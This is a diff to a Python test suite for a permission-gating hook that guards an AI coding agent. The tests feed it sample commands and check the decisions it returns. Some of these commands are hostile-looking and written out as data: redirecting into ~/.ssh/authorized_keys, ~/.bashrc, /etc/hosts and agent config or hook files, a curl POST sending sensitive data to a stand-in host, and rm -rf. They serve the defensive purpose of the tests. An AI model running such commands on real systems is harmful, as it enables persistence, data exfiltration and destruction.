@@ -4,6 +4,7 @@
 from __future__ import annotations
 
 import hashlib
+import inspect
 import json
 import os
 import re
@@ -22,6 +23,11 @@ SCRIPTS = Path(__file__).resolve().parents[1] / "plugins" / "codex-control-plane
 sys.path.insert(0, str(SCRIPTS))
 SCRIPT = SCRIPTS / "control_plane_hook.py"
 DEFAULT_CWD = tempfile.gettempdir()
+LINUX_HOME_FIXTURE = "/" + "home" + "/example"
+MACOS_HOME_FIXTURE = "/" + "Users" + "/example"
+WINDOWS_HOME_FIXTURE = "C:\\" + "Users" + r"\example"
+WINDOWS_HOME_WITH_SPACE_FIXTURE = "C:\\" + "Users" + r"\Example User"
+WINDOWS_SLASH_HOME_FIXTURE = "C:/" + "Users" + "/example"
 
 
 class HookProtocolTests(unittest.TestCase):
@@ -96,14 +102,10 @@ class HookProtocolTests(unittest.TestCase):
         self.apply_environment(overrides)
 
     def reset_event_budget(self) -> None:
-        """In-process dispatch leaves a deadline behind; tests must not inherit it."""
+        """Direct helper tests must start without an event deadline or read cache."""
         module = __import__("control_plane_hook")
-        for reset in (
-            lambda: setattr(module, "_EVENT_DEADLINE", None),
-            module._GIT_QUERY_CACHE.clear,
-        ):
-            reset()
-            self.addCleanup(reset)
+        module._end_event_budget()
+        self.addCleanup(module._end_event_budget)
 
     def setUp(self) -> None:
         self.temp = tempfile.TemporaryDirectory()
@@ -129,6 +131,30 @@ class HookProtocolTests(unittest.TestCase):
         self.session = "test-session"
         self.turn = "test-turn"
         self.tool_sequence = 0
+
+    def test_event_internal_signatures_are_atomic(self) -> None:
+        module = __import__("control_plane_hook")
+        expected = {
+            "_scan_text": ("text",),
+            "_scan_command": ("command",),
+            "_scan_tool_output": ("event", "text"),
+            "_prepare_isolated_git_push": (
+                "object_dir",
+                "object_format",
+                "environment",
+                "token",
+            ),
+            "_is_external_tool": ("tool_name", "tool_input"),
+            "dispatch": ("event",),
+        }
+        for name, parameters in expected.items():
+            with self.subTest(name=name):
+                signature = inspect.signature(getattr(module, name))
+                self.assertEqual(parameters, tuple(signature.parameters))
+        required_parameter = inspect.signature(
+            module._prepare_isolated_git_push
+        ).parameters["token"]
+        self.assertIs(inspect.Parameter.empty, required_parameter.default)
 
     def run_raw(self, payload: str, *, data_dir: str | None = None) -> tuple[subprocess.CompletedProcess[str], dict]:
         env = os.environ.copy()
@@ -422,6 +448,164 @@ class HookProtocolTests(unittest.TestCase):
         )
         self.assertEqual({}, result)
 
+    def test_high_value_redirection_targets_are_denied(self) -> None:
+        module = __import__("control_plane_hook")
+        commands = [
+            "echo value > /etc/hosts",
+            "echo value > /private/etc/hosts",
+            "echo value >> ~/.bashrc",
+            "echo value > ~/.ssh/authorized_keys",
+            'echo value > "$HOME/.gitconfig"',
+            'echo value > "${HOME}/.codex/config.toml"',
+            f'echo value >> "{LINUX_HOME_FIXTURE}/.gitconfig"',
+            f"echo value > {MACOS_HOME_FIXTURE}/.codex/config.toml",
+            "echo value > ~/.codex/AGENTS.md",
+            "echo value > ~/.codex/hooks.json",
+            "echo value > ~/.codex/rules/default.rules",
+            f'echo value > "{WINDOWS_HOME_WITH_SPACE_FIXTURE}\\.ssh\\authorized_keys"',
+            f"echo value >> {WINDOWS_HOME_FIXTURE}\\.gitconfig",
+            f'echo value > "{WINDOWS_HOME_WITH_SPACE_FIXTURE}\\.codex\\config.toml"',
+            f"echo value > {WINDOWS_HOME_FIXTURE}\\.codex\\rules\\default.rules",
+            f"echo value > {WINDOWS_SLASH_HOME_FIXTURE}/.codex/hooks.json",
+        ]
+        for command in commands:
+            with self.subTest(command=command):
+                result = self.bash(command)
+                output = result["hookSpecificOutput"]
+                self.assertEqual("deny", output["permissionDecision"])
+                self.assertIn("profile_persistence", output["permissionDecisionReason"])
+
+        windows_expanded_home_commands = [
+            r"echo value > %USERPROFILE%\.gitconfig",
+            r'echo value > "$env:USERPROFILE\.codex\hooks.json"',
+        ]
+        with mock.patch.object(module, "_looks_like_windows_command", return_value=True):
+            for command in windows_expanded_home_commands:
+                with self.subTest(windows_expanded_home_command=command):
+                    codes = {
+                        finding["code"]
+                        for finding in module._structured_command_findings(command)
+                    }
+                    self.assertIn("profile_persistence", codes)
+
+        custom_home_cases = [
+            ("/srv/example", "/srv/example/.gitconfig"),
+            (r"D:\Profiles\example", r"d:\profiles\EXAMPLE\.codex\config.toml"),
+        ]
+        for expanded_home, target in custom_home_cases:
+            with self.subTest(expanded_home=expanded_home, target=target):
+                with mock.patch.object(module.os.path, "expanduser", return_value=expanded_home):
+                    self.assertTrue(module._is_profile_persistence_redirection_target(target))
+
+        with mock.patch.object(module.sys, "platform", "darwin"):
+            for target in ("/ETC/hosts", "/PRIVATE/ETC/hosts"):
+                with self.subTest(macos_system_target=target):
+                    self.assertTrue(
+                        module._is_profile_persistence_redirection_target(target)
+                    )
+
+    def test_redirect_targets_are_canonicalized_without_blocking_read_only_mentions(
+        self,
+    ) -> None:
+        module = __import__("control_plane_hook")
+        commands = [
+            "echo value >| ~/.codex/cache/../config.toml",
+            f"echo value &> {MACOS_HOME_FIXTURE.lower()}/.CODEX/HOOKS.JSON",
+            f"echo value &>> {WINDOWS_HOME_FIXTURE}\\.codex\\rules\\sub\\..\\default.rules",
+            "echo value > /tmp/../etc/hosts",
+        ]
+        for command in commands:
+            with self.subTest(command=command):
+                result = self.bash(command)
+                output = result["hookSpecificOutput"]
+                self.assertEqual("deny", output["permissionDecision"])
+                self.assertIn("profile_persistence", output["permissionDecisionReason"])
+
+        with mock.patch.object(
+            module.os.path, "expanduser", return_value=MACOS_HOME_FIXTURE
+        ):
+            self.assertTrue(
+                module._is_profile_persistence_redirection_target(
+                    MACOS_HOME_FIXTURE.lower()
+                    + "/.CODEX/cache/../CONFIG.TOML"
+                )
+            )
+
+        for command in (
+            f"rg needle {MACOS_HOME_FIXTURE}/project/../.gitconfig",
+            f"printf '%s\\n' '{WINDOWS_HOME_FIXTURE}\\.codex\\config.toml'",
+        ):
+            with self.subTest(read_only=command):
+                self.assertEqual({}, self.bash(command))
+
+        self.prompt("Process Example Capital position data locally.")
+        read_only = self.bash(
+            f"rg 'position: TEST_POSITION_049' "
+            f"{MACOS_HOME_FIXTURE}/.codex/config.toml"
+        )
+        self.assertNotEqual(
+            "deny",
+            read_only.get("hookSpecificOutput", {}).get("permissionDecision"),
+        )
+        redirected = self.bash(
+            "printf 'position: TEST_POSITION_050' >| ~/.codex/config.toml"
+        )
+        self.assertEqual(
+            "deny", redirected["hookSpecificOutput"]["permissionDecision"]
+        )
+        self.assertIn(
+            "profile_persistence",
+            redirected["hookSpecificOutput"]["permissionDecisionReason"],
+        )
+
+    def test_similar_redirection_targets_do_not_add_denial_noise(self) -> None:
+        module = __import__("control_plane_hook")
+        commands = [
+            "echo value > /tmp/authorized_keys",
+            f"echo value > {LINUX_HOME_FIXTURE}/.ssh/authorized_keys.backup",
+            "echo value > /workspace/.gitconfig",
+            f"echo value > {LINUX_HOME_FIXTURE}/project/.gitconfig",
+            "echo value > /workspace/.codex/config.toml",
+            f"echo value > {LINUX_HOME_FIXTURE}/.codex/config.toml.backup",
+            f"echo value > {LINUX_HOME_FIXTURE}/.codex/cache/config.toml",
+            f"echo value > {LINUX_HOME_FIXTURE}/.codex/rules/README.md",
+            r"echo value > C:\work\.gitconfig",
+            f"echo value > {WINDOWS_HOME_FIXTURE}\\.codex\\logs\\config.toml",
+            "echo value > C:/work/.codex/hooks.json",
+        ]
+        for command in commands:
+            with self.subTest(command=command):
+                codes = {
+                    finding["code"]
+                    for finding in module._structured_command_findings(command)
+                }
+                self.assertNotIn("profile_persistence", codes)
+                self.assertEqual({}, self.bash(command))
+
+        expanded_home_lookalikes = [
+            r"echo value > $HOME/project/.gitconfig",
+            r"echo value > ${HOME}/.codex/config.toml.backup",
+            r"echo value > %USERPROFILE%\.codex\logs\hooks.json",
+            r"echo value > $env:USERPROFILE\.ssh\authorized_keys.backup",
+        ]
+        with mock.patch.object(module, "_looks_like_windows_command", return_value=True):
+            for command in expanded_home_lookalikes:
+                with self.subTest(expanded_home_lookalike=command):
+                    codes = {
+                        finding["code"]
+                        for finding in module._structured_command_findings(command)
+                    }
+                    self.assertNotIn("profile_persistence", codes)
+
+        custom_home_lookalikes = [
+            ("/srv/example", "/srv/example/project/.gitconfig"),
+            (r"D:\Profiles\example", r"D:\Profiles\example\.codex\logs\config.toml"),
+        ]
+        for expanded_home, target in custom_home_lookalikes:
+            with self.subTest(expanded_home=expanded_home, target=target):
+                with mock.patch.object(module.os.path, "expanduser", return_value=expanded_home):
+                    self.assertFalse(module._is_profile_persistence_redirection_target(target))
+
     def test_windows_executable_suffix_preserves_git_classification(self) -> None:
         self.assertEqual({}, self.bash("git.exe status --short"))
         result = self.bash("git.exe commit -m checkpoint")
@@ -676,7 +860,103 @@ class HookProtocolTests(unittest.TestCase):
         module = __import__("control_plane_hook")
         windows_home = "C:\\" + "Users" + r"\example\.codex\memories\note.md"
         self.assertTrue(module._is_durable_destination(windows_home))
-        self.assertTrue(module._is_external_tool("Bash", "Invoke-WebRequest https://example.invalid"))
+        self.assertTrue(
+            module._is_external_tool(
+                "Bash",
+                {"command": "Invoke-WebRequest https://example.invalid"},
+            )
+        )
+
+    def test_bare_publication_words_are_not_durable_destinations(self) -> None:
+        module = __import__("control_plane_hook")
+        for text in (
+            "public",
+            "publish",
+            "marketplace",
+            "src/public/index.html",
+            "ls -la src/public",
+            "git commit -m 'publish docs'",
+            "docs/republished.md",
+        ):
+            with self.subTest(text=text):
+                self.assertFalse(module._is_durable_destination(text))
+
+    def test_external_command_detection_uses_command_fields_only(self) -> None:
+        module = __import__("control_plane_hook")
+        content = (
+            "Document `curl -sS https://example.invalid`, "
+            "`gh release create`, and `open https://example.invalid`."
+        )
+        for tool_name, tool_input in (
+            ("Write", {"file_path": "/tmp/note.md", "content": content}),
+            (
+                "Edit",
+                {
+                    "file_path": "/tmp/note.md",
+                    "old_string": "old",
+                    "new_string": content,
+                },
+            ),
+            (
+                "apply_patch",
+                "*** Begin Patch\n*** Add File: /tmp/note.md\n+" + content + "\n*** End Patch",
+            ),
+        ):
+            with self.subTest(tool_name=tool_name):
+                self.assertFalse(module._is_external_tool(tool_name, tool_input))
+
+        self.assertTrue(
+            module._is_external_tool(
+                "Bash",
+                {"command": "curl -sS https://example.invalid"},
+            )
+        )
+        self.assertTrue(
+            module._is_external_tool(
+                "exec_command",
+                {"cmd": "gh release view"},
+            )
+        )
+
+    def test_durable_destination_detection_uses_destination_fields_only(self) -> None:
+        module = __import__("control_plane_hook")
+        prose_path = "/tmp/project/.codex/memories/example.md"
+        self.assertFalse(
+            module._is_durable_tool_destination(
+                "Write",
+                {
+                    "file_path": "/tmp/note.md",
+                    "content": f"Document the path `{prose_path}` without writing there.",
+                },
+            )
+        )
+        self.assertTrue(
+            module._is_durable_tool_destination(
+                "Write",
+                {
+                    "file_path": prose_path,
+                    "content": "Destination is a real memory path.",
+                },
+            )
+        )
+        self.assertTrue(
+            module._is_durable_tool_destination(
+                "exec_command",
+                {
+                    "cmd": "printf 'position: TEST_POSITION_048'",
+                    "workdir": "/tmp/private-notes/",
+                },
+            )
+        )
+        self.assertTrue(
+            module._is_durable_tool_destination(
+                "Write",
+                {
+                    "file_path": "/tmp/private-notes/report.md",
+                    "content": "Destination matches the private policy marker.",
+                },
+            )
+        )
 
     def test_quoted_windows_scope_preserves_spaces(self) -> None:
         module = __import__("control_plane_hook")
@@ -777,7 +1057,9 @@ class HookProtocolTests(unittest.TestCase):
             "aria2c https://example.invalid/file",
         ]:
             with self.subTest(command=command):
-                self.assertTrue(module._is_external_tool("Bash", command))
+                self.assertTrue(
+                    module._is_external_tool("Bash", {"command": command})
+                )
 
     def test_concurrent_agent_state_updates_do_not_lose_entries(self) -> None:
         session = "concurrent-agent-session"
@@ -962,7 +1244,7 @@ class HookProtocolTests(unittest.TestCase):
             msg="a later event must re-read the remote instead of reusing a cache",
         )
 
-    def test_orphaned_isolated_push_repository_is_removed(self) -> None:
+    def test_orphan_cleanup_respects_live_runner_lease_and_runs_on_events(self) -> None:
         module = __import__("control_plane_hook")
         data = Path(self.data_dir)
         stale_token, live_token, fresh_token = "0" * 32, "1" * 32, "2" * 32
@@ -977,15 +1259,86 @@ class HookProtocolTests(unittest.TestCase):
         expired = time.time() - module._GIT_RUNNER_TTL_SECONDS - 60
         for directory in (stale, live):
             os.utime(directory, (expired, expired))
-        module._write_private_json(
-            module._git_runner_path("running", live_token), {"transaction_id": "live"}
+        live_records = [
+            module._git_runner_path(kind, live_token)
+            for kind in ("request", "status", "running")
+        ]
+        for record in live_records:
+            module._write_private_json(record, {"transaction_id": "live"})
+            os.utime(record, (expired, expired))
+        lease_path = module._git_runner_lease_path(live_token)
+        lease_stream = module._open_private(
+            lease_path, os.O_RDWR | os.O_CREAT | os.O_EXCL
+        )
+        lease_backend = module._lock_state(lease_stream)
+
+        try:
+            self.assertEqual(126, module._run_approved_git(live_token))
+            self.assertTrue(lease_path.exists())
+            self.assertEqual({}, module.dispatch({"hook_event_name": "Unknown"}))
+            self.assertFalse(stale.exists())
+            self.assertTrue(live.exists())
+            self.assertTrue(all(record.exists() for record in live_records))
+            self.assertTrue(fresh.exists())
+        finally:
+            module._unlock_state(lease_stream, lease_backend)
+            lease_stream.close()
+
+        self.assertEqual({}, module.dispatch({"hook_event_name": "Unknown"}))
+        self.assertFalse(live.exists())
+        self.assertFalse(any(record.exists() for record in live_records))
+        self.assertTrue(fresh.exists())
+        module._unlink_owned_regular(lease_path)
+
+    def test_ordinary_event_orphan_cleanup_obeys_deadline_and_candidate_cap(self) -> None:
+        module = __import__("control_plane_hook")
+        records = [
+            module._git_runner_path("request", f"{index:032x}")
+            for index in range(4)
+        ]
+        expired = time.time() - module._GIT_RUNNER_TTL_SECONDS - 60
+        for record in records:
+            module._write_private_json(record, {"transaction_id": "stale"})
+            os.utime(record, (expired, expired))
+
+        with mock.patch.object(module, "_ORPHAN_CLEANUP_CANDIDATE_LIMIT", 2):
+            self.assertEqual({}, module.dispatch({"hook_event_name": "Unknown"}))
+        remaining_after_cap = [record for record in records if record.exists()]
+        self.assertEqual(2, len(remaining_after_cap))
+
+        with mock.patch.object(module, "_EVENT_BUDGET_SECONDS", 0.0):
+            self.assertEqual({}, module.dispatch({"hook_event_name": "Unknown"}))
+        self.assertEqual(
+            remaining_after_cap,
+            [record for record in records if record.exists()],
         )
 
-        module._cleanup_stale_git_runner_records()
+    def test_ordinary_event_tree_cleanup_uses_shared_deadline(self) -> None:
+        module = __import__("control_plane_hook")
+        token = "4" * 32
+        stale = Path(self.data_dir) / f".git-push-{token}-stale"
+        stale.mkdir()
+        expired = time.time() - module._GIT_RUNNER_TTL_SECONDS - 60
+        os.utime(stale, (expired, expired))
+        observed_timeouts: list[float] = []
 
-        self.assertFalse(stale.exists())
-        self.assertTrue(live.exists())
-        self.assertTrue(fresh.exists())
+        def timeout_child(command, **kwargs):
+            self.assertEqual(sys.executable, command[0])
+            self.assertEqual(["-I", "-S", "-c"], command[1:4])
+            timeout = float(kwargs["timeout"])
+            observed_timeouts.append(timeout)
+            raise subprocess.TimeoutExpired(command, timeout)
+
+        started = time.monotonic()
+        with mock.patch.object(module.subprocess, "run", side_effect=timeout_child):
+            self.assertEqual({}, module.dispatch({"hook_event_name": "Unknown"}))
+        elapsed = time.monotonic() - started
+
+        self.assertTrue(stale.exists())
+        self.assertEqual(1, len(observed_timeouts))
+        self.assertGreater(observed_timeouts[0], 0)
+        self.assertLessEqual(observed_timeouts[0], module._EVENT_BUDGET_SECONDS)
+        self.assertLess(elapsed, 1.0)
 
     def test_isolated_push_repository_is_named_for_its_runner_token(self) -> None:
         module = __import__("control_plane_hook")
@@ -1017,19 +1370,36 @@ class HookProtocolTests(unittest.TestCase):
         self.assertEqual(original, state_path.read_bytes())
         self.assertEqual([], list(Path(self.data_dir).glob(".*.tmp")))
 
-    def test_legacy_state_is_migrated_to_current_schema(self) -> None:
-        digest = hashlib.sha256(self.session.encode("utf-8")).hexdigest()[:24]
-        state_path = Path(self.data_dir) / f"session-{digest}.json"
-        state_path.write_text(
-            json.dumps({"schema_version": 1, "active_agents": {}, "updated_at": int(time.time())}),
-            encoding="utf-8",
-        )
+    def test_legacy_state_schemas_are_migrated_to_current_schema(self) -> None:
+        for schema_version in (1, 2, 3):
+            with self.subTest(schema_version=schema_version):
+                session = f"{self.session}-schema-{schema_version}"
+                digest = hashlib.sha256(session.encode("utf-8")).hexdigest()[:24]
+                state_path = Path(self.data_dir) / f"session-{digest}.json"
+                state_path.write_text(
+                    json.dumps(
+                        {
+                            "schema_version": schema_version,
+                            "active_agents": {},
+                            "updated_at": int(time.time()),
+                        }
+                    ),
+                    encoding="utf-8",
+                )
 
-        self.assertEqual({}, self.bash("pwd"))
+                result = self.run_hook(
+                    {
+                        "hook_event_name": "PreToolUse",
+                        "tool_name": "Bash",
+                        "tool_input": {"command": "pwd"},
+                        "session_id": session,
+                    }
+                )
 
-        state = json.loads(state_path.read_text(encoding="utf-8"))
-        self.assertEqual(4, state["schema_version"])
-        self.assertIn("pending_permission_authorizations", state)
+                self.assertEqual({}, result)
+                state = json.loads(state_path.read_text(encoding="utf-8"))
+                self.assertEqual(4, state["schema_version"])
+                self.assertIn("pending_permission_authorizations", state)
 
     def test_malformed_state_fails_closed_without_replacement(self) -> None:
         digest = hashlib.sha256(self.session.encode("utf-8")).hexdigest()[:24]
@@ -1106,6 +1476,95 @@ class HookProtocolTests(unittest.TestCase):
             data_dir="relative-plugin-data",
         )
         self.assertEqual("deny", result["hookSpecificOutput"]["permissionDecision"])
+
+    def test_event_budget_globals_clear_after_success_and_exception(self) -> None:
+        module = __import__("control_plane_hook")
+
+        def successful_handler(_event: dict[str, object]) -> dict[str, object]:
+            self.assertIsNotNone(module._EVENT_DEADLINE)
+            module._GIT_QUERY_CACHE[("fixture",)] = "cached"
+            return {}
+
+        with mock.patch.object(
+            module, "_handle_tool_gate", side_effect=successful_handler
+        ):
+            self.assertEqual({}, module.dispatch({"hook_event_name": "PreToolUse"}))
+        self.assertIsNone(module._EVENT_DEADLINE)
+        self.assertEqual({}, module._GIT_QUERY_CACHE)
+
+        def failing_handler(_event: dict[str, object]) -> dict[str, object]:
+            self.assertIsNotNone(module._EVENT_DEADLINE)
+            module._GIT_QUERY_CACHE[("fixture",)] = "cached"
+            raise RuntimeError("simulated failure")
+
+        with mock.patch.object(
+            module, "_handle_tool_gate", side_effect=failing_handler
+        ):
+            with self.assertRaises(RuntimeError):
+                module.dispatch({"hook_event_name": "PreToolUse"})
+        self.assertIsNone(module._EVENT_DEADLINE)
+        self.assertEqual({}, module._GIT_QUERY_CACHE)
+
+    def test_dispatch_snapshots_policy_and_data_directory_per_event(self) -> None:
+        module = __import__("control_plane_hook")
+        first_policy_path = Path(self.data_dir) / "policy.json"
+        observations: list[object] = []
+        with tempfile.TemporaryDirectory() as second_data_dir:
+            second_policy_path = Path(second_data_dir) / "policy.json"
+            second_policy_path.write_text(
+                json.dumps({"sensitive_markers": ["Second Capital"]}),
+                encoding="utf-8",
+            )
+
+            def first_handler(_event: dict[str, object]) -> dict[str, object]:
+                first_data = module._data_dir()
+                first_policy = module._policy()
+                first_policy_path.write_text(
+                    json.dumps({"sensitive_markers": ["Changed Capital"]}),
+                    encoding="utf-8",
+                )
+                os.environ["PLUGIN_DATA"] = second_data_dir
+                observations.extend(
+                    [
+                        first_data,
+                        module._data_dir(),
+                        first_policy,
+                        module._policy(),
+                    ]
+                )
+                return {}
+
+            def second_handler(_event: dict[str, object]) -> dict[str, object]:
+                observations.extend([module._data_dir(), module._policy()])
+                return {}
+
+            with mock.patch.dict(os.environ, {"PLUGIN_DATA": self.data_dir}, clear=False), mock.patch.object(
+                module, "_private_directory", wraps=module._private_directory
+            ) as private_directory, mock.patch.object(
+                module.json, "loads", wraps=module.json.loads
+            ) as json_loads:
+                with mock.patch.object(module, "_handle_tool_gate", side_effect=first_handler):
+                    self.assertEqual({}, module.dispatch({"hook_event_name": "PreToolUse"}))
+                with mock.patch.object(module, "_handle_tool_gate", side_effect=second_handler):
+                    self.assertEqual({}, module.dispatch({"hook_event_name": "PreToolUse"}))
+
+        self.assertEqual(Path(self.data_dir), observations[0])
+        self.assertEqual(observations[0], observations[1])
+        self.assertIs(observations[2], observations[3])
+        self.assertEqual(["Example Capital"], observations[2]["markers"])
+        self.assertEqual(Path(second_data_dir), observations[4])
+        self.assertEqual(["Second Capital"], observations[5]["markers"])
+        self.assertEqual(2, private_directory.call_count)
+        self.assertEqual(2, json_loads.call_count)
+        self.assertFalse(module._EVENT_SNAPSHOT_ACTIVE)
+        self.assertIsNone(module._EVENT_DATA_DIR)
+        self.assertIsNone(module._EVENT_POLICY)
+        with mock.patch.object(module, "_handle_tool_gate", side_effect=RuntimeError("simulated failure")):
+            with self.assertRaises(RuntimeError):
+                module.dispatch({"hook_event_name": "PreToolUse"})
+        self.assertFalse(module._EVENT_SNAPSHOT_ACTIVE)
+        self.assertIsNone(module._EVENT_DATA_DIR)
+        self.assertIsNone(module._EVENT_POLICY)
 
     def test_natural_language_approvals_are_disabled_by_default(self) -> None:
         with tempfile.TemporaryDirectory() as data_dir:
@@ -1459,7 +1918,9 @@ class HookProtocolTests(unittest.TestCase):
 
         py_launcher = shutil.which("py.exe")
         if not py_launcher:
-            return
+            if os.environ.get("CI"):
+                self.fail("Windows CI must provide py.exe for fallback coverage")
+            self.skipTest("py.exe is unavailable")
         probe_environment = os.environ.copy()
         probe_environment["PYTHON_MANAGER_AUTOMATIC_INSTALL"] = "0"
         py_probe = subprocess.run(
@@ -1481,7 +1942,11 @@ class HookProtocolTests(unittest.TestCase):
             check=False,
         )
         if py_probe.returncode != 0:
-            return
+            if os.environ.get("CI"):
+                self.fail(
+                    "Windows CI py.exe -3 must provide compatible Python 3.9+"
+                )
+            self.skipTest("py.exe -3 does not provide compatible Python 3.9+")
         with tempfile.TemporaryDirectory() as directory:
             root = Path(directory)
             plugin_data = root / "plugin-data"
@@ -1586,18 +2051,15 @@ class HookProtocolTests(unittest.TestCase):
 
     @staticmethod
     def launcher_deadline_bound(jitter_seconds: float = 4.0) -> float:
-        """Derive the bound from the launcher's declared deadline, not a literal.
-
-        What this asserts is that the launcher honours its own shared deadline.
-        A hardcoded ceiling instead measures the CI runner: the previous 7.0
-        left only two seconds over a five-second deadline for PowerShell
-        startup, a compiled probe, and process-tree cleanup, and it failed at
-        7.11s on a run whose sibling job passed on the same commit. The outer
-        subprocess timeout remains the real backstop against an unbounded
-        launcher, so this bound only has to exclude "deadline not honoured".
-        """
-        launcher = (SCRIPTS / "run_control_plane_hook.ps1").read_text(encoding="utf-8")
-        match = re.search(r"^\$probeDeadlineMs\s*=\s*(\d+)$", launcher, re.MULTILINE)
+        """Derive the launcher bound from its declared shared deadline."""
+        launcher = (SCRIPTS / "run_control_plane_hook.ps1").read_text(
+            encoding="utf-8"
+        )
+        match = re.search(
+            r"^\$probeDeadlineMs\s*=\s*(\d+)$",
+            launcher,
+            re.MULTILINE,
+        )
         assert match, "launcher must declare $probeDeadlineMs"
         return int(match.group(1)) / 1000.0 + jitter_seconds
 
@@ -1611,6 +2073,8 @@ class HookProtocolTests(unittest.TestCase):
         )
         csc = next((candidate for candidate in csc_candidates if candidate.exists()), None)
         if csc is None:
+            if os.environ.get("CI"):
+                self.fail("Windows CI must provide .NET Framework csc.exe")
             self.skipTest(".NET Framework C# compiler is unavailable")
         source = r"""
 using System;
@@ -1627,7 +2091,8 @@ public static class Program {
         if (!String.IsNullOrEmpty(pidFile)) {
             File.AppendAllText(
                 pidFile,
-                Process.GetCurrentProcess().Id.ToString() + Environment.NewLine +
+                Path.GetFileName(Environment.GetCommandLineArgs()[0]) + "," +
+                Process.GetCurrentProcess().Id.ToString() + "," +
                 childProcess.Id.ToString() + Environment.NewLine
             );
         }
@@ -1680,13 +2145,19 @@ public static class Program {
             )
             elapsed = time.monotonic() - started
             self.assertEqual(127, completed.returncode, completed.stderr)
-            self.assertLess(elapsed, self.launcher_deadline_bound())
-            pids = {
-                int(line)
-                for line in pid_file.read_text(encoding="utf-8").splitlines()
-                if line.strip().isdigit()
-            }
-            self.assertGreaterEqual(len(pids), 2)
+            self.assertLess(
+                elapsed,
+                self.launcher_deadline_bound(),
+                f"launcher exceeded its declared deadline allowance: {elapsed:.3f}s",
+            )
+            probes: dict[str, tuple[int, int]] = {}
+            probe_lines = pid_file.read_text(encoding="utf-8").splitlines()
+            self.assertEqual(2, len(probe_lines))
+            for line in probe_lines:
+                executable, parent_pid, child_pid = line.split(",")
+                probes[executable.casefold()] = (int(parent_pid), int(child_pid))
+            self.assertEqual({"py.exe", "python.exe"}, set(probes))
+            pids = {pid for process_tree in probes.values() for pid in process_tree}
 
             def running_pids() -> set[int]:
                 alive: set[int] = set()
@@ -1938,6 +2409,13 @@ public static class Program {
 
     def test_authorized_dangerous_command_is_consumed_once(self) -> None:
         self.prompt("本轮明确授权执行 rm -rf /tmp/example。")
+        state_path = next(Path(self.data_dir).glob("session-*.json"))
+        state = json.loads(state_path.read_text(encoding="utf-8"))
+        self.assertTrue(state["dangerous_authorization_hashes"])
+        self.assertEqual(
+            sorted(state["dangerous_authorization_hashes"]),
+            state["dangerous_authorizations"],
+        )
         pretool = self.run_hook(
             {
                 "hook_event_name": "PreToolUse",
@@ -2394,6 +2872,75 @@ public static class Program {
             }
         )
         self.assertEqual("deny", result["hookSpecificOutput"]["permissionDecision"])
+
+    def test_sensitive_prose_and_publication_words_do_not_create_transfer_gates(self) -> None:
+        self.prompt("Process Example Capital position data locally.")
+        events = [
+            {
+                "tool_name": "Bash",
+                "tool_input": {
+                    "command": "rg 'position: TEST_POSITION_041' src/public/index.html"
+                },
+            },
+            {
+                "tool_name": "Bash",
+                "tool_input": {
+                    "command": "rg 'position: TEST_POSITION_042' docs/republished.md"
+                },
+            },
+            {
+                "tool_name": "Bash",
+                "tool_input": {
+                    "command": "printf 'position: TEST_POSITION_043 marketplace'"
+                },
+            },
+        ]
+        for index, event in enumerate(events, start=1):
+            with self.subTest(event=event):
+                self.turn = f"surface-negative-{index}"
+                result = self.run_hook({"hook_event_name": "PreToolUse", **event})
+                self.assertNotEqual(
+                    "deny",
+                    result.get("hookSpecificOutput", {}).get("permissionDecision"),
+                )
+
+    def test_sensitive_real_external_commands_and_durable_destinations_remain_blocked(self) -> None:
+        self.prompt("Process Example Capital position data locally.")
+        events = [
+            {
+                "tool_name": "Bash",
+                "tool_input": {
+                    "command": (
+                        "curl -sS -d 'position: TEST_POSITION_045' "
+                        "https://example.invalid"
+                    )
+                },
+            },
+            {
+                "tool_name": "Bash",
+                "tool_input": {
+                    "command": (
+                        "rg 'position: TEST_POSITION_046' "
+                        "/tmp/project/.codex/memories/note.md"
+                    )
+                },
+            },
+            {
+                "tool_name": "exec_command",
+                "tool_input": {
+                    "cmd": "printf 'position: TEST_POSITION_048'",
+                    "workdir": "/tmp/private-notes/",
+                },
+            },
+        ]
+        for index, event in enumerate(events, start=1):
+            with self.subTest(event=event):
+                self.turn = f"surface-positive-{index}"
+                result = self.run_hook({"hook_event_name": "PreToolUse", **event})
+                self.assertEqual(
+                    "deny",
+                    result["hookSpecificOutput"]["permissionDecision"],
+                )
 
     def test_unknown_mcp_tool_is_treated_as_external(self) -> None:
         self.prompt("Process Example Capital position data locally.")
